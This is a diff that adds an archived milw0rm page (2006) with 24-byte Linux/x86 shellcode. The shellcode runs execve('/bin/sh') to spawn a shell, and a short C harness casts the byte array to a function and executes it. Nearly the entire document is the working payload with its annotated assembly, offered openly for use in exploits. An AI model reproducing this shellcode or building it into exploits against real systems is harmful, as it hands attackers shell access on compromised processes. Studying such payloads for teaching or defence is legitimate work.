@@ -1,0 +1,32 @@
+<html><head><title>linux/x86 execve(/bin/sh) 24 bytes</title></head><pre>/*
+ * [Linux/x86]
+ * Shellcode for: execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)
+ * 24 bytes
+ * hophet [at] gmail.com
+ * http://www.nlabs.com.br/~hophet/
+ * 
+ */
+
+char shellcode[] = 
+
+&quot;\x99&quot;                         // cltd   
+&quot;\x31\xc0&quot;                     // xor    %eax,%eax
+&quot;\x52&quot;                         // push   %edx
+&quot;\x68\x6e\x2f\x73\x68&quot;         // push   $0x68732f6e
+&quot;\x68\x2f\x2f\x62\x69&quot;         // push   $0x69622f2f
+&quot;\x89\xe3&quot;                     // mov    %esp,%ebx
+&quot;\x52&quot;                         // push   %edx
+&quot;\x53&quot;                         // push   %ebx
+&quot;\x89\xe1&quot;                     // mov    %esp,%ecx
+&quot;\xb0\x0b&quot;                     // mov    $0xb,%al
+&quot;\xcd\x80&quot;;                    // int    $0x80
+
+int main() {
+
+	void (*p)();
+	p = (void *)&amp;shellcode;
+	printf(&quot;Lenght: %d\n&quot;, strlen(shellcode));
+	p();
+}
+
+// milw0rm.com [2006-05-01]</pre></html>
